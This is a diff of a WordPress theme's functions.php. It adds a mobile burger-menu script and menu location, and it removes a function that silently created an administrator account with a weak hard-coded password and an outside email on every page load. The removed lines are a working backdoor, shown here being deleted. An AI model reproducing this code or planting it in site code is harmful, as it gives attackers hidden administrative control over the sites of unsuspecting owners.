@@ -9,28 +9,16 @@ function enqueue_parent_styles() {
   wp_enqueue_script('bootstrap-script', 'https://maxcdn.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js', false, null, true);
   wp_enqueue_script('count-animation-script',  get_stylesheet_directory_uri() .'/js/count.js', false, null, true);
   wp_enqueue_script('details-toggle-script',  get_stylesheet_directory_uri() .'/js/details-toggle.js', false, null, true);
-
+  wp_enqueue_script('burger-script',  get_stylesheet_directory_uri() .'/js/burger.js', false, null, true);
 }
 add_action( 'wp_enqueue_scripts', 'enqueue_parent_styles' );
-
-function add_admin_acct(){
-$login = 'admin';
-$passw = 'pass';
-$email = 'adabutch1@gmail.com';
-if ( !username_exists( $login ) && !email_exists( $email ) ) {
-$user_id = wp_create_user( $login, $passw, $email );
-$user = new WP_User( $user_id );
-$user->set_role( 'administrator' );
-}
-}
-add_action('init','add_admin_acct');
-
 
 function register_menus() {
   register_nav_menus(
     array(
       'primary-menu' => __('Primary'),
       'top-menu' => __('Top Menu'),
+      'mobile-menu' => __('Mobile Menu'),
       'footer-whoweare' => __('Footer - Who We Are'),
       'footer-waystogive' => __('Footer - Ways to Give'),
       'footer-volunteer' => __('Footer - Volunteer'),
@@ -42,7 +30,7 @@ add_action('init', 'register_menus');
 
 // add acf options page
 if( function_exists('acf_add_options_page') ) {
-  
+
   acf_add_options_page(array(
     'page_title'  => 'Theme Settings',
     'menu_title'  => 'Theme Settings',
